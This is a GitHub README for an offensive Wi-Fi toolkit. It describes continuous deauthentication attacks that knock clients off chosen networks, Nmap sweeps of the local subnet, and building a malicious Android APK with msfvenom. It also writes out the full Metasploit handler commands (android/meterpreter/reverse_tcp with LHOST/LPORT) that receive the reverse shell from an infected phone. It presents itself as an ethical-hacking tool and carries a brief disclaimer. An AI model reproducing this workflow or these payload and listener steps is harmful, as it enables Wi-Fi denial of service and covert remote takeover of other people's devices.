# VivekXploit_Ultimate_WiFi_Attack_Toolkit
<b>VivekXploit Ultimate is an advanced Python-based Wi-Fi attack toolkit for ethical hackers. It features deauthentication attacks, Nmap network scanning, and Android reverse shell payload generation via Metasploit. Designed for penetration testing with external Wi-Fi adapters in Kali Linux.</b>

# VivekXploit - ULTIMATE Wi-Fi Attack Toolkit

```
__     ___           _    __  __      _       _ _    
 \ \   / (_)_   _____| | __\ \/ /_ __ | | ___ (_) |_  
  \ \ / /| \ \ / / _ \ |/ / \  /| '_ \| |/ _ \| | __|
   \ V / | |\ V /  __/   <  /  \| |_) | | (_) | | |_  
    \_/  |_| \_/ \___|_|\_\/_/\_\ .__/|_|\___/|_|\__|
                                |_|                  
             V i v e k X p l o i t - ULTIMATE
```

## 🔥 Overview

VivekXploit Ultimate is an advanced Python-based Wi-Fi attack toolkit designed for **authorized penetration testing and educational use**. It combines:

* ✅ **Deauthentication (DoS) attacks** on Wi-Fi networks
* ✅ **Nmap scanning** of local networks
* ✅ **Android payload creation** using Metasploit (`msfvenom`)

Created by: **Vivek Dhobale**

## 🚀 Features

| Feature                  | Description                                              |
| ------------------------ | -------------------------------------------------------- |
| 🔺 Deauth Attack         | Scan and disconnect clients from selected Wi-Fi networks |
| 🌐 Nmap Scanner          | Discover all live devices in your local subnet           |
| 📱 Payload Generator     | Create a malicious APK for Android reverse TCP shell     |
| 🔌 Wi-Fi Adapter Support | Works with external adapters in monitor mode             |
| 📂 Log Handling          | CSV files automatically moved to backup folder           |

## ⚙️ Requirements

* OS: **Kali Linux or Parrot OS**
* Python 3.6+
* Root privileges (`sudo`)
* External Wi-Fi adapter (e.g. Alfa AWUS036NHA)
* Tools installed:

  * `airmon-ng`, `airodump-ng`, `aireplay-ng`
  * `nmap`, `msfvenom`

Install Python requirements:

```bash
pip install -r requirements.txt
```

## 📥 Setup & Run

```bash
sudo python3 VivekXploit_Ultimate.py
```

## 🧪 Usage Instructions

### 🔹 Deauthentication Attack

1. Script detects your Wi-Fi adapters
2. Choose interface (e.g., wlan0)
3. Select target from scanned networks
4. Script sends continuous deauth packets

> Press `CTRL+C` to stop attack

---

### 🔹 Nmap Scan (Internal LAN)

* After deauth, select `1` to run network scan:

```
Do you want to run extra tools? (1) Nmap Scan (2) Generate Payload (3) Exit:
```

* Lists live hosts on your network (like 192.168.0.1–255)

---

### 🔹 Metasploit Payload Generator

* Select option `2`
* Enter your **LHOST (your IP)** and **LPORT (e.g., 4444)**
* Output: `vivek_payload.apk`
* Use with Metasploit listener:

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit
```

---

## 📡 Wi-Fi Adapter

To run monitor mode attacks, you **must use** a compatible external USB Wi-Fi adapter that supports injection (e.g., Alfa AWUS036NHA, TP-Link TL-WN722N v1).

## ⚠️ Legal Disclaimer

> This tool is for **educational and authorized penetration testing only**.
> Do not use it on networks you do not own or have permission to test.

Misuse of this tool can be illegal. The developer is not responsible for any damage caused.

## 👨‍💻 Author

* **Vivek Dhobale**
* GitHub: [github.com/VivekXploit](https://github.com/VivekXploit)
* LinkedIn: [linkedin.com/in/vivek-dhobale-vr](https://www.linkedin.com/in/vivek-dhobale-vr)

---

Made with ❤️ for ethical hackers and learners.
